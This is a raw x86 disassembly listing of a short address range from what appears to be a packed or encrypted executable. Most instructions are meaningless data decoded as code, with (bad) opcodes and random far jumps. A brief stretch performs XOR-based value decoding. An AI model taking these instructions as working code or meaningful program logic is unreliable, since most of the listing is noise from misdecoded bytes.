  40565e:	scas   al,BYTE PTR es:[edi]
  40565f:	es inc esp
  405661:	scas   eax,DWORD PTR es:[edi]
  405662:	push   esi
  405663:	lock jo 0x405650
  405666:	push   cs
  405667:	jb     0x40565d
  405669:	xor    dl,BYTE PTR [esi+0x6b]
  40566c:	push   ebp
  40566d:	sub    al,0xa5
  40566f:	push   edi
  405670:	pop    ss
  405671:	jae    0x40566e
  405673:	addr16 mov esi,eax
  405676:	xlat   BYTE PTR ds:[bx]
  405678:	hlt    
  405679:	bound  edi,QWORD PTR [ecx+0x7b]
  40567c:	or     al,0x5
  40567e:	mov    eax,0x779b7603
  405683:	xor    al,0xa8
  405685:	mov    esi,0xdc2ee40f
  40568a:	push   ebp
  40568b:	pop    esp
  40568c:	jp     0x405666
  40568e:	lahf   
  40568f:	push   ebp
  405690:	and    DWORD PTR [eax+eiz*8],edx
  405693:	or     al,0xc6
  405695:	fiadd  WORD PTR [eax]
  405697:	jo     0x405686
  405699:	mov    esi,0x64d5039b
  40569e:	(bad)  
  40569f:	sub    DWORD PTR [edx-0x7846c980],esi
  4056a5:	xor    BYTE PTR [edx],al
  4056a7:	add    bl,BYTE PTR [eax-0x47]
  4056aa:	mov    al,ds:0x8739a22d
  4056af:	lods   eax,DWORD PTR ds:[esi]
  4056b0:	cwde   
  4056b1:	xor    eax,0x83d7aa
  4056b6:	push   eax
  4056b7:	sbb    BYTE PTR ds:0x258ff8fd,bh
  4056bd:	outs   dx,BYTE PTR ds:[esi]
  4056be:	mov    ebp,DWORD PTR [edi]
  4056c0:	dec    BYTE PTR [esp+edi*2]
  4056c3:	sbb    DWORD PTR ds:0x33d68a18,ebx
  4056c9:	(bad)  
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	shl    DWORD PTR [ebx-0x1f],1
  4056e5:	xchg   esp,eax
  4056e6:	nop
  4056e7:	mov    esi,0xbdbebe1f
  4056ec:	les    edi,FWORD PTR [esi+0xe6a40be]
  4056f2:	ret    0xf074
  4056f5:	test   ecx,edi
  4056f7:	or     bh,BYTE PTR [eax+0x4c]
  4056fa:	mov    bl,0xa5
  4056fc:	int    0x56
  4056fe:	sbb    eax,0x2e346273
  405703:	ss cld 
  405705:	pop    ss
  405706:	test   eax,0x3f587d
  40570b:	repz sub al,0x97
  40570e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40570f:	fs in  al,dx
  405711:	pop    eax
  405712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405713:	bound  esp,QWORD PTR [edx-0x1a]
  405716:	fmul   QWORD PTR [edx-0x67a712a4]
  40571c:	sub    cl,BYTE PTR [ebx+eiz*8-0x667136bf]
  405723:	push   ebx
  405724:	jge    0x405781
  405726:	xchg   BYTE PTR [eax+0xbc86c78],cl
  40572c:	outs   dx,BYTE PTR ds:[esi]
  40572d:	pushf  
  40572e:	pop    ss
  40572f:	out    0xbb,al
  405731:	adc    bl,BYTE PTR [ebp+0x12]
  405734:	lock test eax,0xc3c13f01
  40573a:	xchg   esi,eax
  40573b:	stc    
  40573c:	inc    edx
  40573d:	mov    dl,0xe8
  40573f:	mov    edx,0x75473c10
  405744:	popa   
  405745:	bound  esi,QWORD PTR [edi]
  405747:	add    DWORD PTR [edx-0x54a673fc],esi
  40574d:	xchg   edi,eax
  40574e:	inc    eax
  40574f:	aad    0x53
  405751:	rcr    DWORD PTR [edx+edx*2-0x5c],cl
  405755:	push   es
  405756:	outs   dx,BYTE PTR ds:[esi]
  405757:	pop    es
  405758:	loope  0x405725
  40575a:	sbb    BYTE PTR [ecx+eax*1],ah
  40575d:	xchg   di,ax
  40575f:	jns    0x405789
  405761:	adc    ecx,DWORD PTR [edi-0x6586b30d]
  405767:	dec    ebx
  405768:	jg     0x4057e9
  40576a:	sti    
  40576b:	ds (bad) 
  40576d:	aam    0x4c
  40576f:	mov    ah,0x5a
  405771:	push   ebx
  405772:	pop    es
  405773:	jmp    0x9dd4:0x61330e3c
  40577a:	or     bh,bh
  40577c:	pop    ss
  40577d:	jb     0x405727
  40577f:	(bad)  
  405780:	fldlg2 
  405782:	mov    ebx,0x54f1e214
  405787:	mov    ch,0x1
  405789:	mul    DWORD PTR [ebp+0x61059eea]
  40578f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405790:	repz aas 
  405792:	or     eax,0x2da2dafd
  405797:	les    ecx,FWORD PTR [edi+edi*2-0x53d6fd66]
  40579e:	loopne 0x405805
  4057a0:	sbb    BYTE PTR [eax-0x6817bebf],dl
  4057a6:	fdivr  QWORD PTR [ebp+edx*2-0x31]
  4057aa:	cmp    eax,0xc3a21bed
  4057af:	jae    0x40574e
  4057b1:	outs   dx,DWORD PTR ds:[esi]
  4057b2:	ins    BYTE PTR es:[edi],dx
  4057b3:	aam    0xe5
  4057b5:	fwait
  4057b6:	and    al,BYTE PTR [edi+0x67]
  4057b9:	stc    
  4057ba:	shr    BYTE PTR [ebx+ecx*4+0x40a55bbe],0x2b
  4057c2:	cwde   
  4057c3:	mov    dh,BYTE PTR [edx]
  4057c5:	pop    ecx
  4057c6:	loope  0x4057cd
  4057c8:	fadd   DWORD PTR [edi]
  4057ca:	inc    edi
  4057cb:	add    ebp,DWORD PTR [edi]
  4057cd:	sub    eax,0x4d21736e
  4057d2:	rcr    BYTE PTR [edi],0x2
  4057d5:	and    cl,BYTE PTR [ebx]
  4057d7:	aad    0xb8
  4057d9:	call   0x52d9770b
  4057de:	mov    eax,0x366f2185
  4057e3:	and    eax,0xee8d2f0
  4057e8:	ud0    ebx,DWORD PTR [ecx+ebp*8]
  4057ec:	imul   esi,DWORD PTR [ebp+0x1131296c],0x1a
  4057f3:	mov    bh,0xe1
  4057f5:	push   es
  4057f6:	retf   0xe7a5
  4057f9:	sahf   
  4057fa:	aad    0x30
  4057fc:	cmp    al,0x12
  4057fe:	fcomp  DWORD PTR [ecx+0x39]
  405801:	add    bl,al
  405803:	add    cl,bh
  405805:	in     eax,0x4b
  405807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405808:	faddp  st(3),st
  40580a:	aas    
  40580b:	loope  0x4057de
  40580d:	sbb    al,0x7d
  40580f:	push   0xffffffdc
  405811:	retf   
  405812:	adc    DWORD PTR [ecx-0x2c8b19a3],esp
  405818:	mov    al,0x89
  40581a:	sbb    BYTE PTR [edi-0x1e],0xda
  40581e:	int    0xba
  405820:	stos   DWORD PTR es:[edi],eax
  405821:	call   0x956b2bbf
  405826:	adc    eax,0xf7f9a7d4
  40582b:	mov    ds:0xbbd6ef24,eax
  405830:	pop    edx
  405831:	out    0xfd,al
  405833:	call   0x31438d69
  405838:	arpl   bp,sp
  40583a:	adc    DWORD PTR [ecx+0x2a4d6cc6],ecx
  405840:	or     esi,0x26810d64
  405846:	sub    dh,BYTE PTR [ebp-0x72]
  405849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40584a:	xor    cl,BYTE PTR [ecx+0x6a0f62fb]
  405850:	ret    
  405851:	dec    esp
  405852:	xor    DWORD PTR [ebx],ecx
  405854:	or     BYTE PTR [esi+0x2c],bh
  405857:	mov    dh,0x6
  405859:	hlt    
  40585a:	sub    esi,esi
  40585c:	fild   DWORD PTR [edi]
  40585e:	xchg   esi,eax
  40585f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405860:	rcl    DWORD PTR [eax],0x9d
  405863:	fidiv  DWORD PTR [edi+0x2a]
  405866:	mov    dl,0x39
  405868:	mov    cl,0x31
  40586a:	int    0x3f
  40586c:	adc    DWORD PTR [edi-0x6af548f6],esi
  405872:	mov    ds:0x1d574103,al
  405877:	and    esi,DWORD PTR [eax]
  405879:	fimul  WORD PTR [esi]
  40587b:	add    bh,ah
  40587d:	pop    ecx
  40587e:	fbstp  TBYTE PTR [edi+0x40]
  405881:	sbb    eax,edx
  405883:	pop    ebx
  405884:	inc    eax
  405885:	cwde   
  405886:	dec    ecx
  405887:	dec    esi
  405888:	adc    al,0xf7
  40588a:	jp     0x405870
  40588c:	sbb    DWORD PTR [esi],ebp
  40588e:	mov    bl,0x82
  405890:	test   dl,0xf5
  405893:	pop    ss
  405894:	pop    ebx
  405895:	shl    DWORD PTR [esi+ebp*1+0xe0a255],1
  40589c:	ret    
  40589d:	mov    dh,0x98
  40589f:	cmp    edx,DWORD PTR [ebx-0x7f645e38]
  4058a5:	inc    ebx
  4058a6:	ret    0xe434
  4058a9:	call   0x8db8e51e
  4058ae:	dec    ecx
  4058af:	xchg   ebp,eax
  4058b0:	pusha  
  4058b1:	in     eax,0x19
  4058b3:	mov    cl,0xf5
  4058b5:	and    BYTE PTR [edi+0x4f],bl
  4058b8:	ins    BYTE PTR es:[edi],dx
  4058b9:	adc    eax,0x78442a54
  4058be:	inc    ebp
  4058bf:	xchg   ebx,eax
  4058c0:	das    
  4058c1:	ins    BYTE PTR es:[edi],dx
  4058c2:	out    0xdf,al
  4058c4:	inc    ebp
  4058c5:	call   ebp
  4058c7:	fmul   st,st(5)
  4058c9:	pop    eax
  4058ca:	stos   DWORD PTR es:[edi],eax
  4058cb:	icebp  
  4058cc:	out    dx,al
  4058cd:	mov    eax,ds:0xf23cd1da
  4058d2:	aas    
  4058d3:	xor    al,0x96
  4058d5:	sub    al,0xbd
  4058d7:	xchg   esp,eax
  4058d8:	in     al,dx
  4058d9:	scas   eax,DWORD PTR es:[edi]
  4058da:	and    DWORD PTR [edx+0x1304fc0b],0x38acccdf
  4058e4:	mov    esp,0xe6350097
  4058e9:	xchg   al,dh
  4058eb:	push   es
  4058ec:	lods   eax,DWORD PTR ds:[esi]
  4058ed:	lods   eax,DWORD PTR ds:[esi]
  4058ee:	mov    DWORD PTR [ebp+eax*8+0x147bb823],edi
  4058f5:	icebp  
  4058f6:	xlat   BYTE PTR ds:[ebx]
  4058f7:	jb     0x40591f
  4058f9:	mov    WORD PTR [eax+ebp*4],fs
  4058fc:	mov    ah,0xb1
  4058fe:	mov    ch,0xbb
  405900:	push   ss
  405901:	inc    ecx
  405902:	jmp    0x6c5:0xd877cca7
  405909:	ret    
  40590a:	ins    DWORD PTR es:[edi],dx
  40590b:	xchg   DWORD PTR [edi-0x61],edi
  40590e:	int3   
  40590f:	ins    BYTE PTR es:[edi],dx
  405910:	sub    dh,BYTE PTR [ebp-0x3a8a7b47]
  405916:	mov    eax,0x15be7ea2
  40591b:	(bad)  
  40591c:	cli    
  40591d:	leave  
  40591e:	add    edx,DWORD PTR [eax+ebp*8]
  405921:	scas   eax,DWORD PTR es:[edi]
  405922:	rol    DWORD PTR [edi],cl
  405924:	cmp    dh,BYTE PTR ds:0xbfd7b1f5
  40592a:	fidiv  DWORD PTR [esi+0x40712bdb]
  405930:	scas   al,BYTE PTR es:[edi]
  405931:	jns    0x4058d1
  405933:	je     0x405972
  405935:	out    0xa8,al
  405937:	adc    eax,0x694ce086
  40593c:	jl     0x40596e
  40593e:	out    dx,al
  40593f:	wbinvd 
  405941:	icebp  
  405942:	cwde   
  405943:	jae    0x40599c
  405945:	(bad)  
  405946:	leave  
  405947:	inc    edx
  405948:	inc    ecx
  405949:	imul   DWORD PTR [ebx+eiz*1-0x5008315]
  405950:	dec    ecx
  405951:	sbb    al,0xc3
  405953:	test   DWORD PTR [ebx+0x56fa2bee],edi
  405959:	cmc    
  40595a:	into   
  40595b:	retf   
  40595c:	retf   
  40595d:	int3   
  40595e:	(bad)  
  40595f:	mov    ch,0x72
  405961:	daa    
  405962:	stos   BYTE PTR es:[edi],al
  405963:	mov    ebx,DWORD PTR [ebx-0x6b3180db]
  405969:	ror    ecx,1
  40596b:	mov    ds:0x714888e4,eax
  405970:	faddp  st(0),st
  405972:	iret   
  405973:	jecxz  0x4059e8
  405975:	push   ds
  405976:	aad    0x8a
  405978:	je     0x4059cb
  40597a:	(bad)  
  40597b:	frstor [eax-0x65d89e03]
  405981:	mov    dh,0x3d
  405983:	jb     0x405978
  405985:	ror    DWORD PTR [edi+eiz*1],1
  405988:	xor    ebx,DWORD PTR [esi+ebx*4-0x7bfa4425]
  40598f:	aaa    
  405990:	push   ds
  405991:	mov    ecx,0x6b399f2e
  405996:	test   eax,0xe0a6219d
  40599b:	ffree  st(1)
  40599d:	or     edi,DWORD PTR [edx+0x258756e0]
  4059a3:	retf   0x9aae
  4059a6:	inc    edx
  4059a7:	cwde   
  4059a8:	xor    esp,DWORD PTR [ecx]
  4059aa:	mov    ch,0x20
  4059ac:	sbb    eax,0x2a6ed11f
  4059b1:	ret    
  4059b2:	inc    edx
  4059b3:	sbb    eax,0xbf12a345
  4059b8:	int3   
  4059b9:	icebp  
  4059ba:	icebp  
  4059bb:	scas   eax,DWORD PTR es:[edi]
  4059bc:	cmp    al,0xdc
  4059be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059bf:	sti    
  4059c0:	repnz hlt 
  4059c2:	jbe    0x405987
  4059c4:	add    DWORD PTR [ebx],ebx
  4059c6:	dec    esp
  4059c7:	test   BYTE PTR [esi+0xa],ch
  4059ca:	adc    eax,0x77f212a0
  4059cf:	iret   
  4059d0:	lods   eax,DWORD PTR ds:[esi]
  4059d1:	cld    
  4059d2:	or     al,0xf
  4059d4:	mov    ecx,0xaf222e8a
  4059d9:	ror    DWORD PTR [esp+eax*4],1
  4059dc:	sbb    BYTE PTR [edx-0x33be6e65],bh
  4059e2:	jmp    0x4059f6
  4059e4:	add    DWORD PTR [ebx-0x1e],0xffffffc6
  4059e8:	outs   dx,BYTE PTR fs:[esi]
  4059ea:	cwde   
  4059eb:	test   DWORD PTR [eax-0x49],ebp
  4059ee:	fldenv [edx]
  4059f0:	(bad)  
  4059f1:	jg     0x405a67
  4059f3:	addps  xmm5,XMMWORD PTR [edi-0x80]
  4059f7:	dec    ebx
  4059f8:	pop    ebp
  4059f9:	and    eax,0x99ef83ce
  4059fe:	nop
  4059ff:	cmp    ebx,DWORD PTR [ecx+0x40c623db]
  405a05:	cmp    BYTE PTR [eax-0x3492942c],ah
  405a0b:	ss xchg edi,eax
  405a0d:	nop
  405a0e:	(bad)  
  405a0f:	fcmovu st,st(2)
  405a11:	shl    BYTE PTR [edx],0x14
  405a14:	sub    BYTE PTR [edx-0x56],ch
  405a17:	and    eax,0xed894476
  405a1c:	xchg   DWORD PTR [ebx],edx
  405a1e:	std    
  405a1f:	xchg   ebp,eax
  405a20:	jl     0x405a81
  405a22:	add    esi,ebp
  405a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a25:	add    BYTE PTR [esi],bl
  405a27:	push   ds
  405a28:	sub    edi,DWORD PTR [ebp+0x11]
  405a2b:	sti    
  405a2c:	iret   
  405a2d:	xchg   edi,eax
  405a2e:	mov    dl,0x8b
  405a30:	and    al,BYTE PTR [esp+edi*4]
  405a33:	mov    ch,0x5f
  405a35:	or     eax,0x3093497c
  405a3a:	ins    DWORD PTR es:[edi],dx
  405a3b:	cdq    
  405a3c:	daa    
  405a3d:	pushf  
  405a3e:	ret    0x304f
  405a41:	xchg   edx,eax
  405a42:	xor    eax,0x5c34192a
  405a47:	sar    cl,1
  405a49:	outs   dx,DWORD PTR ds:[esi]
  405a4a:	pop    edx
  405a4b:	inc    eax
  405a4c:	dec    esi
  405a4d:	and    ebx,ebx
  405a4f:	or     eax,0x4befdfd8
  405a54:	out    dx,eax
  405a55:	jbe    0x405a4b
  405a57:	arpl   WORD PTR [ebp+0x41],dx
  405a5a:	xor    BYTE PTR [esi-0x58],ah
  405a5d:	mov    bl,0xc7
  405a5f:	neg    DWORD PTR [edi]
  405a61:	adc    eax,0x7678c53c
  405a66:	sbb    DWORD PTR [edx+eax*2],ebx
  405a69:	dec    edx
  405a6a:	add    eax,0x91ba4961
  405a6f:	jae    0x4059f2
  405a71:	loop   0x405ac6
  405a73:	and    eax,edx
  405a75:	xor    ecx,edi
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	inc    ebx
  405ad1:	jl     0x405aaa
  405ad3:	jecxz  0x405a92
  405ad5:	and    eax,0xc4bdbebe
  405ada:	mov    esi,0x1f82febe
  405adf:	xchg   esp,eax
  405ae0:	pushf  
  405ae1:	imul   esi,DWORD PTR [ebp+ebp*4+0x33],0x5
  405ae6:	push   ebp
  405ae7:	repz rcr dh,0x6a
  405aeb:	pop    ecx
  405aec:	jecxz  0x405afb
  405aee:	in     eax,dx
  405aef:	imul   edi,DWORD PTR [ebx+0x6d58b7fc],0xa8f88cca
  405af9:	aaa    
  405afa:	sbb    ecx,DWORD PTR [ebp-0x7fb03f11]
  405b00:	sub    al,0x40
  405b02:	ret    
  405b03:	shr    ecx,0x9f
  405b06:	fwait
  405b07:	push   DWORD PTR [edi-0x17]
  405b0a:	inc    edi
  405b0b:	inc    ebx
  405b0c:	call   0x81a37deb
  405b11:	rcl    edi,cl
  405b13:	test   DWORD PTR [ebx-0x2d],edi
  405b16:	arpl   WORD PTR [ecx+0x324221e],di
  405b1c:	inc    ecx
  405b1d:	jno    0x405b85
  405b1f:	mov    edx,0xbc2ece90
  405b24:	jmp    0x9db5:0xb7181056
  405b2b:	aad    0x1c
  405b2d:	add    ch,BYTE PTR [edx+edi*2+0x31fb0a12]
  405b34:	sbb    eax,0x5ddef605
  405b39:	xchg   esi,eax
  405b3a:	repz jp 0x405b55
  405b3d:	add    ah,ch
  405b3f:	mov    esp,0xf18a327a
  405b44:	mov    edx,0x20f5384f
  405b49:	inc    esi
  405b4a:	mov    bl,BYTE PTR [eax+0x76d6334c]
  405b50:	jno    0x405b74
  405b52:	ss in  al,dx
  405b54:	mov    ah,0x82
  405b56:	out    dx,eax
  405b57:	std    
  405b58:	sti    
  405b59:	ror    BYTE PTR [ecx],1
  405b5b:	inc    ebp
  405b5c:	dec    edi
  405b5d:	push   0xffffff9b
  405b5f:	and    BYTE PTR [edx-0x242bcc52],dl
  405b65:	cwde   
  405b66:	jg     0x405ba5
  405b68:	ret    0xfda1
  405b6b:	mov    ebp,0xc6ee5bba
  405b70:	test   BYTE PTR [eax-0x13],bl
  405b73:	adc    eax,0xf9d6a596
  405b78:	ins    BYTE PTR es:[edi],dx
  405b79:	jge    0x405b61
  405b7b:	test   BYTE PTR [edi+edx*4+0x475c8c2c],ch
  405b82:	adc    eax,0xdaf5c9eb
  405b87:	sub    BYTE PTR [eax-0x31],0x21
  405b8b:	add    BYTE PTR [ebx-0x58050135],bh
  405b91:	add    DWORD PTR ds:0x17eda3b1,esp
  405b97:	daa    
  405b98:	ficom  DWORD PTR [esi+0x4c]
  405b9b:	imul   edx,esp,0x58b75084
  405ba1:	jg     0x405bd6
  405ba3:	js     0x405b47
  405ba5:	mov    esi,0xd7b14b5b
  405baa:	arpl   WORD PTR [esi-0x9a5c611],dx
  405bb0:	xor    eax,0x24c6452d
  405bb5:	mov    bl,0xc1
  405bb7:	dec    ecx
  405bb8:	fcomp  st(3)
  405bba:	xchg   cx,ax
  405bbc:	hlt    
  405bbd:	jl     0x405c3e
  405bbf:	cmc    
  405bc0:	push   0xdd0f7008
  405bc5:	test   BYTE PTR [eax],bl
  405bc7:	add    bl,BYTE PTR [esi]
  405bc9:	neg    DWORD PTR [esi+0x70406ad4]
  405bcf:	xlat   BYTE PTR ds:[ebx]
  405bd0:	std    
  405bd1:	jbe    0x405bcf
  405bd3:	and    DWORD PTR [edx+0x3885a020],ecx
  405bd9:	shr    BYTE PTR [esi],cl
  405bdb:	add    edx,esp
  405bdd:	or     DWORD PTR [esi],ebp
  405bdf:	(bad)  [ebx+0x7225733d]
  405be5:	outs   dx,BYTE PTR ds:[esi]
  405be6:	lea    ebx,[ecx+0x48511b14]
  405bec:	xchg   esp,eax
  405bed:	dec    eax
  405bee:	and    eax,0xa1e4202e
  405bf3:	add    dl,BYTE PTR [esi+0x4b75f612]
  405bf9:	rcr    BYTE PTR [ebp-0x5da34ee2],cl
  405bff:	repnz mov dl,BYTE PTR [esi]
  405c02:	(bad)  
  405c03:	adc    esi,DWORD PTR [eax+0x7427025b]
  405c09:	repz test DWORD PTR [edx],esp
  405c0c:	cwde   
  405c0d:	stos   BYTE PTR es:[edi],al
  405c0e:	cld    
  405c0f:	jg     0x405c20
  405c11:	(bad)  
  405c12:	scas   al,BYTE PTR es:[edi]
  405c13:	add    eax,0xf3c62bca
  405c18:	fistp  WORD PTR [ebx+0x2d]
  405c1b:	sbb    DWORD PTR [edi],ebx
  405c1d:	cmp    DWORD PTR [ebx-0x6a],esi
  405c20:	inc    ecx
  405c21:	cmp    ebx,DWORD PTR ds:0xaa7825b
  405c27:	in     al,0xdc
  405c29:	xor    al,0xaf
  405c2b:	in     eax,dx
  405c2c:	shl    ch,cl
  405c2e:	inc    esp
  405c2f:	sahf   
  405c30:	and    DWORD PTR [edx],ebx
  405c32:	sbb    esp,DWORD PTR [ebx+eiz*2]
  405c35:	imul   esp,ecx,0xc
  405c38:	dec    eax
  405c39:	push   esp
  405c3a:	imul   eax,edi,0xffffffa1
  405c3d:	xor    BYTE PTR [eax],dh
  405c3f:	or     BYTE PTR [edx+0x560118be],cl
  405c45:	jecxz  0x405c44
  405c47:	push   esp
  405c48:	call   0xcf59:0x4afa6b2c
  405c4f:	int3   
  405c50:	outs   dx,DWORD PTR ds:[esi]
  405c51:	mov    ebx,0xba95b10f
  405c56:	jp     0x405c4f
  405c58:	xchg   BYTE PTR [ecx+0x19],bl
  405c5b:	outs   dx,BYTE PTR cs:[esi]
  405c5d:	dec    esp
  405c5e:	sbb    ah,BYTE PTR [ecx-0x4a]
  405c61:	dec    ebp
  405c62:	pop    eax
  405c63:	in     eax,dx
  405c64:	retf   0xc79
  405c67:	out    0x6b,al
  405c69:	test   DWORD PTR [eax-0xda6d362],edi
  405c6f:	jmp    0x696e2ef7
  405c74:	jmp    0x405c8d
  405c76:	adc    al,0xd1
  405c78:	les    ecx,FWORD PTR fs:[edi-0x3e]
  405c7c:	shl    BYTE PTR [eax-0x4f],1
  405c7f:	add    eax,0xf1789794
  405c84:	rcr    ecx,cl
  405c86:	xchg   ecx,eax
  405c87:	(bad)  
  405c88:	pusha  
  405c89:	inc    ebp
  405c8a:	out    dx,al
  405c8b:	je     0x405c1b
  405c8d:	leave  
  405c8e:	mov    bl,0x71
  405c90:	pop    ebp
  405c91:	mov    eax,ds:0xf1a162be
  405c96:	scas   eax,DWORD PTR es:[edi]
  405c97:	cld    
  405c98:	push   edx
  405c99:	push   esp
  405c9a:	test   DWORD PTR [ebx+0x55366473],ecx
  405ca0:	mov    esp,0x50fac783
  405ca5:	cli    
  405ca6:	hlt    
  405ca7:	(bad)  
  405ca8:	cdq    
  405ca9:	mov    al,ds:0x91461af2
  405cae:	bound  esp,QWORD PTR [edx+0x11]
  405cb1:	out    dx,al
  405cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cb3:	aad    0xf3
  405cb5:	or     ecx,ebx
  405cb7:	or     dh,BYTE PTR [edi-0x154f4b5e]
  405cbd:	repnz dec ebx
  405cbf:	pop    edi
  405cc0:	(bad)  
  405cc1:	push   esp
  405cc2:	sub    ah,ah
  405cc4:	push   cs
  405cc5:	pop    ecx
  405cc6:	xchg   DWORD PTR [ebx],edi
  405cc8:	jne    0x405c5e
  405cca:	adc    BYTE PTR [esi+0x1f229664],dh
  405cd0:	inc    esi
  405cd1:	adc    BYTE PTR [esi-0x5ba75bc6],cl
  405cd7:	sbb    eax,0x7913245
  405cdc:	aad    0x61
  405cde:	sbb    eax,0xa07f8b7b
  405ce3:	inc    eax
  405ce4:	adc    eax,DWORD PTR [eax]
  405ce6:	mov    ah,0xca
  405ce8:	out    0x1c,al
  405cea:	add    DWORD PTR [esi-0x1af484b5],esi
  405cf0:	arpl   WORD PTR [esi-0x2c],bx
  405cf3:	fucomi st,st(4)
  405cf5:	push   esp
  405cf6:	pop    eax
  405cf7:	and    BYTE PTR [eax-0x7e4fbdb7],bh
  405cfd:	push   cs
  405cfe:	data16 ficomp DWORD PTR [ebx-0x2c]
  405d02:	sbb    ebx,DWORD PTR [eax+ebx*2+0x44]
  405d06:	popf   
  405d07:	adc    BYTE PTR [ebp-0xd],cl
  405d0a:	sbb    BYTE PTR [edx+eiz*2-0x9],cl
  405d0e:	les    eax,FWORD PTR [esi-0x6d]
  405d11:	push   bp
  405d13:	xor    al,0xc0
  405d15:	mov    ds:0x23463d79,eax
  405d1a:	retf   
  405d1b:	into   
  405d1c:	jae    0x405d35
  405d1e:	cwde   
  405d1f:	jmp    0x405cc5
  405d21:	jg     0x405d20
  405d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d24:	and    al,0x2a
  405d26:	outs   dx,DWORD PTR ds:[esi]
  405d27:	test   esi,esi
  405d29:	sbb    DWORD PTR [ebp-0x875360],ebp
  405d2f:	ret    0x60dc
  405d32:	es cli 
  405d34:	stos   DWORD PTR es:[edi],eax
  405d35:	or     dl,BYTE PTR [edx]
  405d37:	push   eax
  405d38:	setg   BYTE PTR [edi-0x1a682ef9]
  405d3f:	retf   0x2f2a
  405d42:	dec    esp
  405d43:	test   ch,dl
  405d45:	cmp    al,0xf3
  405d47:	daa    
  405d48:	push   esp
  405d49:	or     cl,dl
  405d4b:	fist   DWORD PTR [edi-0x36]
  405d4e:	push   esp
  405d4f:	test   BYTE PTR [ebp+0x6f],dh
  405d52:	push   edi
  405d53:	sub    DWORD PTR [esi+0x6b],esi
  405d56:	adc    al,0x66
  405d58:	dec    edx
  405d59:	or     al,0x93
  405d5b:	mov    esp,0xf98d6d7e
  405d60:	in     eax,0xd2
  405d62:	ret    
  405d63:	xchg   ecx,eax
  405d64:	push   esi
  405d65:	or     eax,0xc6505bbe
  405d6a:	cmp    eax,0x39b22c48
  405d6f:	and    DWORD PTR [edi+0x5f],0x7d39283f
  405d76:	adc    BYTE PTR [ebx+0x60],dl
  405d79:	test   al,0x9
  405d7b:	pop    ebp
  405d7c:	mov    ebx,DWORD PTR [edi-0x9]
  405d7f:	aam    0x25
  405d81:	push   0xffffffc5
  405d83:	mov    al,0xa2
  405d85:	dec    ebp
  405d86:	push   ebp
  405d87:	imul   edx,edi,0xffffffed
  405d8a:	mov    ebp,0x363f970a
  405d8f:	mov    ecx,0x5d3775f8
  405d94:	sub    ecx,DWORD PTR [edx+0x63]
  405d97:	shl    eax,0x1d
  405d9a:	jg     0x405d5e
  405d9c:	popf   
  405d9d:	sbb    DWORD PTR [esi],esp
  405d9f:	fyl2x  
  405da1:	sub    al,0xec
  405da3:	push   esp
  405da4:	fsubr  DWORD PTR ss:[eax+ebx*8-0x82d196e]
  405dac:	das    
  405dad:	and    BYTE PTR fs:[edi+0x56],cl
  405db1:	adc    DWORD PTR [ebx],esi
  405db3:	sbb    bh,BYTE PTR [ecx+0x63]
  405db6:	lahf   
  405db7:	scas   al,BYTE PTR es:[edi]
  405db8:	pop    ebp
  405db9:	xchg   DWORD PTR [ebx-0x27217d7a],eax
  405dbf:	cmp    BYTE PTR [esi],ch
  405dc1:	lea    edi,[ecx-0x2a]
  405dc4:	pop    ebp
  405dc5:	dec    edi
  405dc6:	and    esp,DWORD PTR [eax-0x1e]
  405dc9:	(bad)  
  405dcb:	mov    edx,0x37cd8ed2
  405dd0:	sbb    al,0xf8
  405dd2:	leave  
  405dd3:	cmc    
  405dd4:	mov    BYTE PTR [edx+0x6d2d00c3],ch
  405dda:	(bad)  
  405ddb:	aas    
  405ddc:	les    eax,FWORD PTR [esi-0x26eefa17]
  405de2:	retf   
  405de3:	clc    
  405de4:	and    dl,ch
  405de6:	adc    al,BYTE PTR [edi+0x7cead2a3]
  405dec:	xor    ebp,DWORD PTR [edx]
  405dee:	inc    ebx
  405def:	pushf  
  405df0:	jl     0x405d9e
  405df2:	xor    ebx,DWORD PTR [ebx+0xf]
  405df5:	pop    edx
  405df6:	sahf   
  405df7:	mov    ds:0x497450a8,eax
  405dfc:	dec    edx
  405dfd:	repz xor esi,esi
  405e00:	stos   DWORD PTR es:[edi],eax
  405e01:	out    0xdf,al
  405e03:	mov    ds:0xdf2a4b17,eax
  405e08:	mov    eax,0xa3b3e191
  405e0d:	mov    ah,0xd6
  405e0f:	adc    edi,DWORD PTR [ecx+edi*1-0x2d]
  405e13:	mov    ds:0x54d70fc0,eax
  405e18:	pop    ds
